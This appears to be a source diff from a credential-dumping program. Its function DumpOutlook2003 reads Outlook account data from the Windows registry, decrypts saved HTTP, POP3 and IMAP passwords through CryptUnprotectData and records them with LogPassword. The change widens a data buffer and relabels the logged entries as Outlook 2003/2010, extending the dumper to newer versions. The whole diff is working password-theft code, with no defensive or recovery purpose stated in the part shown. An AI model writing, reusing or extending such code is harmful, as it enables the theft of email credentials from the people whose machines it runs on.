@@ -328,7 +328,7 @@ void DumpOutlook2003()
 {
 	HKEY hkeyresult, hkeyresult1;
 	char name[256],skey[400];
-	BYTE data[256];
+	BYTE data[1024];
 	WCHAR server[100];
 	WCHAR user[100];
 	WCHAR password[100];
@@ -379,7 +379,7 @@ void DumpOutlook2003()
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
 					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
-					LogPassword(L"Outlook 2003/2007 HTTP", server, user, password);
+					LogPassword(L"Outlook 2003/2010 HTTP", server, user, password);
 					LocalFree(dbout.pbData);
 				}
 			}
@@ -400,7 +400,7 @@ void DumpOutlook2003()
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
 					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
-					LogPassword(L"Outlook 2003/2007 POP3", server, user, password);
+					LogPassword(L"Outlook 2003/2010 POP3", server, user, password);
 					LocalFree(dbout.pbData);
 				}
 			}
@@ -421,7 +421,7 @@ void DumpOutlook2003()
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
 					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
-					LogPassword(L"Outlook 2003/2007 IMAP", server, user, password);
+					LogPassword(L"Outlook 2003/2010 IMAP", server, user, password);
 					LocalFree(dbout.pbData);
 				}
 			}
